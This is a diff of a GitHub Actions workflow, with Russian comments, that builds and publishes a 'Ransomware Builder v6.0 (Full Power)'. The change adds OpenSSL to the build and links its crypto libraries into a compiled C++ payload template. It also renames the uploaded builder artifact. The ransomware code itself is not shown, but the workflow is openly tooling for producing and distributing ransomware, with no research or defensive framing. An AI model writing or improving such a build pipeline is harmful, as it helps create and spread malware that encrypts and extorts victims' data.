@@ -1,4 +1,4 @@
-name: Build Ransomware Builder v6.0
+name: Build Ransomware Builder v6.0 (Full Power)
 
 on:
   push:
@@ -13,13 +13,21 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v4
     
+    # ========== СБОРКА ОПЕНССЛ ==========
+    - name: Setup OpenSSL
+      run: |
+        choco install openssl -y
+        echo "OPENSSL_ROOT_DIR=C:\Program Files\OpenSSL" >> $env:GITHUB_ENV
+        echo "OPENSSL_INCLUDE_DIR=C:\Program Files\OpenSSL\include" >> $env:GITHUB_ENV
+        echo "OPENSSL_LIBRARIES=C:\Program Files\OpenSSL\lib" >> $env:GITHUB_ENV
+    
     # ========== СБОРКА ШАБЛОНА (C++) ==========
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
     
     - name: Build Template
       run: |
-        cl /O2 /MT /EHsc /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib
+        cl /O2 /MT /EHsc /std:c++17 /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\libssl.lib" "C:\Program Files\OpenSSL\lib\libcrypto.lib"
         dir template.exe
     
     # ========== СБОРКА БИЛДЕРА (C#) ==========
@@ -36,5 +44,5 @@ jobs:
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
-        name: RansomwareBuilder_v6
+        name: RansomwareBuilder_v6_Full
         path: bin/Release/net48/RansomwareBuilder.exe
